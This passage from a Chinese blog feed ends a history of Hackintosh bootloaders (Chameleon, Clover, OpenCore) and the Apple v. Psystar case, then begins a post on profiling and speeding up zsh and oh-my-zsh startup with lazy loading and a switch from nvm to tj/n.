PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span 